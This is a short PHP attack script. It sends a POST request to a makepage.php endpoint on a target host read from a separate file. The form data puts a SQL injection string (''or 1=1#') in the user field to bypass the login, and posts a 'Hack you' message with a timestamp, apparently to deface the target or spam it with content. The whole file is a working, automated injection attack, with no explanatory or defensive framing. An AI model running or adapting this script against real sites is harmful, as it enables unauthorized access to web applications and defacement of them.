<?php date_default_timezone_set("Asia/Hong_Kong");
   function send_post($url, $post_data) 
   {    
      $postdata = http_build_query($post_data);    
      $options = array(    
            'http' => array(    
                'method' => 'POST',    
                'header' => 'Content-type:application/x-www-form-urlencoded',    
                'content' => $postdata,    
                'timeout' => 15 * 60 // 超时时间（单位:s）    
            )    
        );    
        $context = stream_context_create($options);    
        $result = file_get_contents($url, false, $context);             
        return $result;   
	}
	$tt = time();
	$time = date('y-m-d h:i:s a', $tt);
	$content = 'Hack you  '.$time.'!';
	$post_data = array(
	'code' => $content,
    'user' =>  '\'or 1=1#',
    'password' => 'dengwo',
	'submit' => 'submit',
	);
	include_once("store.php");
	$url = "http://"."$host"."/"."$yaoqingma"."/"."makepage.php";
	$ans = send_post($url, $post_data);
	#echo $ans;

?>



